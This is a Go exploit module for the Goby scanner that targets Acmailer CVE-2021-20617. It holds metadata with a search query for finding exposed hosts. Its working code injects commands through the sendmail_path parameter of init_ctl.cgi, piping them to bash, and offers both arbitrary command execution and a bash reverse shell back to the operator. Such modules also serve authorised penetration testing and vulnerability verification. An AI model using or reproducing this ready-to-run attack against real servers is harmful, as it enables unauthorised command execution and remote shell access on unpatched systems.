package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Acmailer init_ctl.cgi sendmail_path Remote Command Execution Vulnerability (CVE-2021-20617)",
    "Description": "<p>Acmailer is a CGI software used to support mail services.</p><p>Acmailer 4.0.2 and earlier versions have a security vulnerability. The vulnerability is due to the fact that init_ctl.cgi does not strictly verify input parameters, and attackers can execute arbitrary commands to obtain server permissions.</p>",
    "Product": "acmailer",
    "Homepage": "https://www.acmailer.jp/",
    "DisclosureDate": "2020-12-17",
    "Author": "h1ei1",
    "FofaQuery": "body=\"CGI acmailer\"",
    "GobyQuery": "body=\"CGI acmailer\"",
    "Level": "2",
    "Impact": "<p>Acmailer 4.0.2 and earlier versions have a security vulnerability. The vulnerability is due to the fact that init_ctl.cgi does not strictly verify input parameters, and attackers can execute arbitrary commands to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.acmailer.jp/info/de.cgi?id=98\">https://www.acmailer.jp/info/de.cgi?id=98</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2021-20617"
    ],
    "CNNVD": [
        "CNNVD-202101-1149"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Acmailer 邮件系统 init_ctl.cgi 文件 sendmail_path 参数远程命令执行漏洞（CVE-2021-20617）",
            "Product": "acmailer-邮件系统",
            "Description": "<p>Acmailer 是一款用于支持邮件服务的CGI软件。</p><p>Acmailer 4.0.2版本及之前版本存在安全漏洞，该漏洞源于 init_ctl.cgi 没有严格校验输入参数，攻击者可执行任意命令获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.acmailer.jp/info/de.cgi?id=98\">https://www.acmailer.jp/info/de.cgi?id=98</a><br></p>",
            "Impact": "<p>Acmailer 4.0.2 版本及之前版本存在安全漏洞，该漏洞源于 init_ctl.cg i没有严格校验输入参数，攻击者可执行任意命令获取服务器权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Acmailer init_ctl.cgi sendmail_path Remote Command Execution Vulnerability (CVE-2021-20617)",
            "Product": "acmailer",
            "Description": "<p>Acmailer is a CGI software used to support mail services.</p><p>Acmailer 4.0.2 and earlier versions have a security vulnerability. The vulnerability is due to the fact that init_ctl.cgi does not strictly verify input parameters, and attackers can execute arbitrary commands to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://www.acmailer.jp/info/de.cgi?id=98\">https://www.acmailer.jp/info/de.cgi?id=98</a><br></p>",
            "Impact": "<p>Acmailer 4.0.2 and earlier versions have a security vulnerability. The vulnerability is due to the fact that init_ctl.cgi does not strictly verify input parameters, and attackers can execute arbitrary commands to obtain server permissions.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10809"
}`

	sendPayloadJIPWOEU := func(hostInfo *httpclient.FixUrl, cmd string) {
		uri := "/init_ctl.cgi"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = fmt.Sprintf("admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|%s%%20|%%20bash&homeurl=http%%3A%%2F%%2F&mypath=e", url.QueryEscape(cmd))
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		httpclient.DoHttpRequest(hostInfo, cfg)
	}
	getExecuteResultWJIOEUJ := func(hostInfo *httpclient.FixUrl, filename string) string {
		configGet := httpclient.NewGetRequestConfig("/" + filename)
		resp, err := httpclient.DoHttpRequest(hostInfo, configGet)
		if err != nil {
			return ""
		}
		if len(resp.Utf8Html) > 0 {
			return resp.Utf8Html
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(10)
			tempFilename := goutils.RandomHexString(5) + ".txt"
			sendPayloadJIPWOEU(hostInfo, fmt.Sprintf("echo `%s`>%s", "echo "+checkStr, tempFilename))
			respHtml := getExecuteResultWJIOEUJ(hostInfo, tempFilename)
			return strings.Contains(respHtml, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["attackType"].(string) == "cmd" {
				cmd := ss.Params["cmd"].(string)
				tempFilename := goutils.RandomHexString(5) + ".txt"
				sendPayloadJIPWOEU(expResult.HostInfo, fmt.Sprintf("echo `%s`>%s", cmd, tempFilename))
				respHtml := getExecuteResultWJIOEUJ(expResult.HostInfo, tempFilename)
				expResult.Output = respHtml
				expResult.Success = true
			} else if ss.Params["attackType"].(string) == "reverse" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = "godclient bind failed!"
					expResult.Success = false
					return expResult
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					sendPayloadJIPWOEU(expResult.HostInfo, cmd)
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}

